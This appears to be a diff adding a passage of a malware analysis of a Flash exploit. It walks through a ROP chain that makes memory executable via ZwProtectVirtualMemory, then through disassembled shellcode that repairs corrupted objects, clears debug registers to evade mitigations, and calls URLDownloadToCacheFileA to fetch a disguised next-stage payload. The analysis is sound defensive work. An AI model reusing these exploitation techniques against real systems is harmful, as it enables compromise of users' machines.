@@ -1,0 +1,47 @@
+• ROP and Shellcode
+The ROP payload basically tries to make memory at 0×18184000 executable, and to return to 0x1818411c
+to execute the shellcode.
+0:008> dds eax
+18184100 770b5f58 ntdll!ZwProtectVirtualMemory
+18184104 1818411c
+18184108 ffffffff
+1818410c 181840e8
+18184110 181840ec
+18184114 00000040
+18184118 181840e4
+Inside the shellcode, it saves the current stack pointer to 0×18181800 to safely return to the caller.
+mov   dword ptr ds:[18181800h],ebp
+Then, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid
+application crashes.
+18184123 b820609f06   mov   eax,69F6020h
+18184128 90       nop
+18184129 90       nop
+1818412a c700c0f22169  mov   dword ptr [eax],offset
+Flash32_11_7_700_261!AdobeCPGetAPI+0x42ac00 (6921f2c0)
+18184133 b800401818   mov   eax,18184000h
+18184138 90       nop
+18184139 90       nop
+1818413a c700fe030000  mov   dword ptr [eax],3FEh
+ds:0023:18184000=3ffffff0
+The shellcode also recovers the ESP register to make sure the stack range is in the current thread stack
+base/limit.
+18184140 8be5      mov   esp,ebp
+18184142 83ec2c     sub   esp,2Ch
+18184145 90       nop
+18184146 eb2c      jmp   18184174
+The shellcode calls SetThreadContext to clear the debug registers. It is possible that this is an attempt to
+bypass mitigations that use the debug registers.
+18184174 57       push  edi
+18184175 81ece0050000  sub   esp,5E0h
+1818417b c7042410000100 mov   dword ptr [esp],10010h
+18184182 8d7c2404    lea   edi,[esp+4]
+18184186 b9dc050000   mov   ecx,5DCh
+1818418b 33c0      xor   eax,eax
+1818418d f3aa      rep stos byte ptr es:[edi]
+1818418f 54       push  esp
+18184190 6afe      push  0FFFFFFFEh
+18184192 b8b308b476   mov   eax,offset kernel32!SetThreadContext
+(76b408b3)
+18184197 ffd0      call  eax
+The shellcode calls URLDownloadToCacheFileA to download the next stage of the payload, disguised as
+an image.
